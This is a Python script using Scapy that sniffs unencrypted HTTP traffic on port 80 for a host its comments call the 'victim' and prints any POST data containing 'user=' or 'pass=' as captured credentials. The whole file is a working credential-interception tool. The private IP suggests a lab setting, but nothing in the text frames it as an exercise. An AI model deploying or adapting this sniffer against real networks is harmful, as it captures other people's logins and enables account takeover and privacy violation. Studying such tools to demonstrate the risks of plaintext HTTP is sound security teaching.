#!/usr/bin/env python3

# http_sniff.py: Scapy Sniffer for Insecure HTTP Credentials

from scapy.all import sniff, TCP, IP, Raw
import sys

def process_packet(packet):
    # Check if the packet has an IP layer, a TCP layer, and a Raw (data) layer
    if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(TCP):

        raw_data = packet[Raw].load.decode(errors='ignore')

        # Look for HTTP POST method and specific POST data fields (user= or pass=)
        if "POST /" in raw_data and ("user=" in raw_data or "pass=" in raw_data):

            #Print results
            print("\n" + "="*70)
            print(f"!!! SENSITIVE DATA CAPTURED from {packet[IP].src} !!!")
            print("--- HTTP PAYLOAD (Layer 7 Data) ---")

            # Use carriage returns (\r\n) to split POST data for clean output
            for line in raw_data.split('\r\n'):
                if line:
                    # Highlight actual credentials data
                    if "user=" in line or "pass=" in line:
                        print(f"    [CREDENTIALS] {line}")
                    else:
                        print(f"    {line}")

            print("="*70 + "\n")
            sys.stdout.flush()

print("HTTP Sniffer started. Waiting for unencrypted POST data...")

# Sniff TCP traffic on port 80, filter only for victim's host, and do not store packets
sniff(filter="tcp port 80 and host 10.0.0.10", prn=process_packet, store=0, iface="eth0")
    